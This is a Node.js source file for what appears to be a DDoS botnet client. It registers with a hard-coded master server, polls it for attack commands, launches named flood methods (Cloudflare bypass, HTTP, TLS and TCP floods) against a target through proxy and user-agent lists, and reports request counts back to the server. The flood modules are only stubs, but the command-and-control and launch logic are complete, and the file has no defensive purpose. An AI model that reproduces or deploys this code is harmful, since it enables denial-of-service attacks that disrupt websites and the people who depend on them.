const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const os = require('os');
const crypto = require('crypto');

// ========== CONFIGURATION ==========
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com'; // CHANGE THIS
const PORT = process.env.PORT || process.env.SERVER_PORT || 5552;
const MAX_REGISTRATION_ATTEMPTS = 5;

// ========== GENERATE UNIQUE BOT ID ==========
const generateBotId = () => {
  const hostname = os.hostname();
  const pid = process.pid;
  const random = crypto.randomBytes(4).toString('hex');
  return `${hostname}-${pid}-${random}`;
};

const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `${os.hostname()}-agent`;

// ========== GLOBAL VARIABLES ==========
let registrationAttempts = 0;
let activeProcesses = [];
let isBlocked = false;
let proxyList = [];
let uaList = [];
let currentProxyIndex = 0;
let currentUaIndex = 0;
let requestCount = 0;
let totalRequests = 0;
let currentAttack = null;
let attackStartTime = null;

// ========== COLORS ==========
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m',
  redBright: '\x1b[91m',
  greenBright: '\x1b[92m',
  yellowBright: '\x1b[93m',
  blueBright: '\x1b[94m',
  magentaBright: '\x1b[95m',
  cyanBright: '\x1b[96m'
};

function color(text, colorCode) {
  return `${colorCode}${text}${colors.reset}`;
}

// ========== AUTO INSTALL NPM PACKAGES ==========
async function installNpmPackages() {
  const requiredPackages = [
    'express', 'axios', 'socks', 'random-useragent', 'cookie-parser',
    'express-rate-limit', 'https-proxy-agent', 'socks-proxy-agent',
    'set-cookie-parser', 'hpack', 'colors'
  ];
  console.log(color('\n🔍 Checking npm packages...', colors.cyan));
  const missingPackages = [];
  for (const pkg of requiredPackages) {
    try {
      require.resolve(pkg);
      console.log(color(`   ✅ ${pkg} - installed`, colors.gray));
    } catch (e) {
      console.log(color(`   ⬇️  ${pkg} - missing`, colors.yellow));
      missingPackages.push(pkg);
    }
  }
  if (missingPackages.length > 0) {
    console.log(color(`\n📦 Installing: ${missingPackages.join(', ')}`, colors.cyan));
    return new Promise((resolve, reject) => {
      const install = spawn('npm', ['install', ...missingPackages, '--no-save'], { stdio: 'inherit', shell: true });
      install.on('close', (code) => {
        if (code === 0) {
          console.log(color('\n✅ All packages installed!\n', colors.green));
          resolve();
        } else reject(new Error('Installation failed'));
      });
    });
  }
  return Promise.resolve();
}

// ========== CREATE PROXY.TXT / UA.TXT ==========
function createProxyFile() {
  if (!fs.existsSync('proxy.txt')) {
    fs.writeFileSync('proxy.txt', '# Proxy list - one per line\n# Format: ip:port\n');
    console.log(color('📄 Created proxy.txt template', colors.green));
  }
}
function createUaFile() {
  if (!fs.existsSync('ua.txt')) {
    const userAgents = [
      '# User Agents - one per line',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ];
    fs.writeFileSync('ua.txt', userAgents.join('\n'));
    console.log(color('📄 Created ua.txt template', colors.green));
  }
}

// ========== CREATE METHODS DIRECTORY AND STUBS (.cs) ==========
function createMethodScripts() {
  const methodsDir = path.join(__dirname, 'methods');
  if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });

  const writeStub = (filename, content) => {
    const filePath = path.join(methodsDir, filename);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, content);
      console.log(color(`   ✅ Created ${filename}`, colors.green));
    }
  };

  // FIXED: use toUpperCase() instead of ToUpper
  const csStub = (name) => `using System;
class ${name} {
    static void Main(string[] args) {
        Console.WriteLine("[${name.toUpperCase()}] Starting attack (C# stub)");
        int time = args.Length > 1 ? int.Parse(args[1]) : 60;
        System.Threading.Thread.Sleep(time * 1000);
        Console.WriteLine("[${name.toUpperCase()}] Attack complete");
    }
}`;

  // List of all methods that are now .cs (from your repo)
  const csMethods = [
    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
  ];
  for (const m of csMethods) {
    writeStub(`${m}.cs`, csStub(m));
  }

  // Keep Node.js stubs for the ones still in .js (R10 series, etc.)
  const stub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
  const jsMethods = [
    'nust', 'w-flood1', 'vhold', 'uam', 'wil',
    'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'
  ];
  for (const m of jsMethods) {
    writeStub(`${m}.js`, stub(m));
  }

  console.log(color('✅ All method stubs created! (Replace with real .cs / .exe later)\n', colors.green));
}

// ========== REPORTING FUNCTION ==========
async function sendReport(target, method, requestsMade, duration) {
  try {
    const axios = require('axios');
    await axios.post(`${MASTER_SERVER}/api/report`, {
      botId: BOT_ID,
      target,
      method,
      requests: requestsMade,
      duration
    }, { headers: { 'Content-Type': 'application/json' } });
    console.log(color(`📊 Report sent: ${requestsMade} requests to ${target}`, colors.cyan));
  } catch (error) {
    console.log(color(`⚠️ Report failed: ${error.message}`, colors.yellow));
  }
}

// ========== HELPER: Map method name to safe filename ==========
function getMethodFilename(method) {
  const methodMap = {
    'R9': 'high-dstat',
    'PRIV-TOR': 'w-flood1',
    'HOLD-PANEL': 'http-panel',
    'R1': 'vhold',
    'UAM': 'uam',
    'W.I.L': 'wil',
    'HTTP-SICARIO': 'REX-COSTUM',
    'RAW-HTTP': 'h2-nust',
    'CF-BYPASS': 'cf-bypass',
    'MODERN-FLOOD': 'modern-flood',
    'RAW-GET': 'raw-get'
  };
  if (methodMap[method]) return methodMap[method];
  return method.toLowerCase().replace(/[\s.]+/g, '-');
}

// ========== EXECUTE A SINGLE COMMAND (supports .exe, .cs, .js) ==========
function executeCommand(methodName, target, time, additionalArgs = []) {
  const baseName = getMethodFilename(methodName);
  const exePath = path.join(__dirname, 'methods', `${baseName}.exe`);
  const csPath = path.join(__dirname, 'methods', `${baseName}.cs`);
  const jsPath = path.join(__dirname, 'methods', `${baseName}.js`);

  let command, argsList;

  if (fs.existsSync(exePath)) {
    command = exePath;
    argsList = [target, time, ...additionalArgs];
    console.log(color(`⚡ EXEC (C# EXE): ${command} ${argsList.join(' ')}`, colors.cyan));
  } else if (fs.existsSync(csPath)) {
    command = 'dotnet';
    argsList = ['run', csPath, target, time, ...additionalArgs];
    console.log(color(`⚡ EXEC (C# SCRIPT): dotnet run ${csPath} ${target} ${time}`, colors.cyan));
  } else if (fs.existsSync(jsPath)) {
    command = 'node';
    argsList = [jsPath, target, time, ...additionalArgs];
    console.log(color(`⚡ EXEC (NODE.JS): node ${jsPath} ${target} ${time}`, colors.cyan));
  } else {
    console.log(color(`❌ No executable found for method: ${methodName} (tried .exe, .cs, .js)`, colors.red));
    return null;
  }

  const proc = spawn(command, argsList, { detached: true, stdio: 'pipe' });
  proc.stdout?.on('data', (data) => {
    const lines = data.toString().split('\n');
    lines.forEach(line => {
      if (line.includes('Request') || line.includes('GET') || line.includes('POST') ||
          line.includes('Sent') || line.includes('packet') || line.includes('connection')) {
        requestCount++;
        totalRequests++;
      }
    });
  });
  proc.stderr?.on('data', (data) => console.error(color(`⚠️ ${data}`, colors.yellow)));
  proc.on('error', (err) => console.error(color(`❌ Error: ${err.message}`, colors.red)));
  return proc;
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
  currentAttack = { id: Date.now(), target, methods, startTime: Date.now() };
  requestCount = 0;
  attackStartTime = Date.now();

  // Composite attacks (multiple commands) – keep hardcoded
  switch(methods) {
    case 'RAPID10':
      const r10files = ['r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
                        'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'];
      for (const f of r10files) {
        const proc = executeCommand(f, target, time, ['30', 'proxy.txt', 'ua.txt']);
        if (proc) activeProcesses.push(proc);
      }
      break;
    case 'HTTP-SICARIO':
      const sicarioFiles = ['REX-COSTUM', 'cibi', 'BYPASS', 'nust'];
      const sicarioArgs = [
        ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1'],
        ['16', '3', 'proxy.txt'],
        ['32', '2', 'proxy.txt'],
        ['12', '4', 'proxy.txt']
      ];
      for (let i = 0; i < sicarioFiles.length; i++) {
        const proc = executeCommand(sicarioFiles[i], target, time, sicarioArgs[i]);
        if (proc) activeProcesses.push(proc);
      }
      break;
    case 'R9':
      const r9Files = ['high-dstat', 'w-flood1', 'vhold', 'nust', 'BYPASS'];
      const r9Args = [
        ['32', '7', 'proxy.txt'],
        ['8', '3', 'proxy.txt'],
        ['16', '2', 'proxy.txt'],
        ['16', '2', 'proxy.txt'],
        ['8', '1', 'proxy.txt']
      ];
      for (let i = 0; i < r9Files.length; i++) {
        const proc = executeCommand(r9Files[i], target, time, r9Args[i]);
        if (proc) activeProcesses.push(proc);
      }
      break;
    case 'PRIV-TOR':
      const torFiles = ['w-flood1', 'high-dstat', 'cibi', 'BYPASS', 'nust'];
      const torArgs = [
        ['64', '6', 'proxy.txt'],
        ['16', '2', 'proxy.txt'],
        ['12', '4', 'proxy.txt'],
        ['10', '4', 'proxy.txt'],
        ['10', '1', 'proxy.txt']
      ];
      for (let i = 0; i < torFiles.length; i++) {
        const proc = executeCommand(torFiles[i], target, time, torArgs[i]);
        if (proc) activeProcesses.push(proc);
      }
      break;
    case 'R1':
      const r1Files = ['vhold', 'high-dstat', 'cibi', 'BYPASS', 'REX-COSTUM', 'w-flood1', 'vhold', 'nust'];
      const r1Args = [
        ['15', '2', 'proxy.txt'],
        ['64', '2', 'proxy.txt'],
        ['4', '2', 'proxy.txt'],
        ['16', '2', 'proxy.txt'],
        ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1'],
        ['8', '3', 'proxy.txt'],
        ['16', '2', 'proxy.txt'],
        ['32', '3', 'proxy.txt']
      ];
      for (let i = 0; i < r1Files.length; i++) {
        const proc = executeCommand(r1Files[i], target, time, r1Args[i]);
        if (proc) activeProcesses.push(proc);
      }
      break;
    default:
      // Single‑file method: try to run it
      const proc = executeCommand(methods, target, time, methods === 'CF-BYPASS' ? ['4', '32', 'proxy.txt'] :
                                            methods === 'MODERN-FLOOD' ? ['4', '64', 'proxy.txt'] :
                                            methods === 'RAW-HTTP' ? ['15', '2', 'proxy.txt'] :
                                            methods === 'RAW-GET' ? ['20', '800'] :
                                            methods === 'HOLD-PANEL' ? [] :
                                            methods === 'UAM' ? ['5', '4', '6'] :
                                            methods === 'W.I.L' ? ['10', '8', '4'] : []);
      if (proc) activeProcesses.push(proc);
      break;
  }

  // Auto‑kill all processes after duration + buffer
  setTimeout(() => {
    activeProcesses.forEach(proc => {
      try { proc.kill(); } catch (e) {}
    });
    activeProcesses = [];
  }, parseInt(time) * 1000 + 5000);

  // Report after attack finishes
  setTimeout(() => {
    if (requestCount > 0) {
      sendReport(target, methods, requestCount, time);
    }
  }, (parseInt(time) * 1000) + 2000);
}

// ========== STOP ALL ATTACKS ==========
function stopAllAttacks() {
  console.log(color(`🔪 Killing ${activeProcesses.length} processes`, colors.red));
  activeProcesses.forEach(proc => {
    try { proc.kill(); } catch (error) {}
  });
  activeProcesses = [];
  currentAttack = null;
  requestCount = 0;
  console.log(color(`✅ All attacks stopped`, colors.green));
}

// ========== MAIN BOT (rest unchanged) ==========
async function startBot() {
  console.log(color('\n🤖 AUTO-REGISTER BOT CLIENT', colors.cyanBright));
  console.log(color('='.repeat(50), colors.cyan));
  console.log(color(`🆔 Bot ID: ${BOT_ID}`, colors.magentaBright));
  console.log(color(`📛 Bot Name: ${BOT_NAME}`, colors.magentaBright));
  console.log(color('='.repeat(50), colors.cyan));

  createProxyFile();
  createUaFile();
  createMethodScripts();
  await installNpmPackages();

  const express = require('express');
  const axios = require('axios');
  const randomUseragent = require('random-useragent');
  const cookieParser = require('cookie-parser');

  const app = express();
  app.use(express.json());
  app.use(cookieParser());

  function loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        proxyList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#') && line.includes(':'));
        console.log(color(`[PROXY] Loaded ${proxyList.length} proxies`, colors.cyan));
      }
    } catch (error) { console.log(color('[PROXY] Error: ' + error.message, colors.red)); }
  }

  function loadUserAgents() {
    try {
      if (fs.existsSync('ua.txt')) {
        const data = fs.readFileSync('ua.txt', 'utf8');
        uaList = data.split('\n')
          .map(line => line.trim())
          .filter(line => line && !line.startsWith('#'));
        console.log(color(`[UA] Loaded ${uaList.length} user agents`, colors.green));
      }
    } catch (error) { console.log(color('[UA] Error: ' + error.message, colors.red)); }
  }

  const httpsAgent = new https.Agent({ rejectUnauthorized: false, keepAlive: true });
  const api = axios.create({ timeout: 10000, httpsAgent, headers: { 'Content-Type': 'application/json' } });

  async function autoRegister() {
    if (isBlocked) {
      console.log(color(`\n❌ [BLOCKED] This bot has been permanently blocked!`, colors.redBright));
      process.exit(0);
    }
    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
      console.log(color(`⚠️ Max attempts reached. Retry in 60s...`, colors.yellow));
      setTimeout(() => { registrationAttempts = 0; autoRegister(); }, 60000);
      return;
    }
    try {
      console.log(color(`📡 Registering to: ${MASTER_SERVER}/register`, colors.cyan));
      const payload = { id: BOT_ID, name: BOT_NAME };
      const response = await api.post(`${MASTER_SERVER}/register`, payload);
      if (response.data.approved) {
        console.log(color(`\n✅ [SUCCESS] Bot registered!`, colors.greenBright));
        setInterval(() => checkForCommands(), 3000);
        setInterval(() => sendHeartbeat(), 30000);
        return;
      }
    } catch (error) {
      if (error.response?.status === 403) {
        console.log(color(`\n❌ Bot is blocked!`, colors.redBright));
        isBlocked = true;
        process.exit(0);
      }
      registrationAttempts++;
      setTimeout(() => autoRegister(), 5000);
    }
  }

  async function sendHeartbeat() {
    try {
      await api.get(`${MASTER_SERVER}/ping`);
      console.log(color(`💓 Heartbeat | ID: ${BOT_ID} | Total Reqs: ${totalRequests}`, colors.green));
    } catch (error) {
      console.log(color(`💔 Heartbeat failed`, colors.red));
      registrationAttempts = 0;
      autoRegister();
    }
  }

  async function checkForCommands() {
    try {
      const response = await api.get(`${MASTER_SERVER}/get-command`, { params: { botId: BOT_ID } });
      if (response.data.hasCommand) {
        const command = response.data.command;
        if (command.action === 'stop') {
          console.log(color(`\n🛑 STOP RECEIVED`, colors.yellowBright));
          stopAllAttacks();
        } else if (command.action === 'attack') {
          const { target, time, methods } = command;
          console.log(color(`\n⚡ COMMAND: ${methods} → ${target} for ${time}s`, colors.magentaBright));
          executeAttack(target, time, methods);
        }
      }
    } catch (error) {}
  }

  app.get('/health', (req, res) => {
    res.json({
      status: 'online',
      botId: BOT_ID,
      uptime: process.uptime(),
      totalRequests,
      proxies: proxyList.length,
      userAgents: uaList.length,
      currentAttack: currentAttack ? {
        target: currentAttack.target,
        method: currentAttack.methods,
        duration: Math.floor((Date.now() - attackStartTime) / 1000),
        requests: requestCount
      } : null
    });
  });

  app.get('/ping', (req, res) => {
    res.json({ alive: true, botId: BOT_ID, uptime: process.uptime(), timestamp: Date.now(), totalRequests });
  });

  app.listen(PORT, async () => {
    loadProxies();
    loadUserAgents();
    console.log(color(`🤖 Bot HTTP server listening on port ${PORT}`, colors.green));
    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
    setTimeout(() => autoRegister(), 3000);
  });
}

startBot().catch(error => {
  console.error(color('Failed to start bot:', colors.red), error);
  process.exit(1);
});
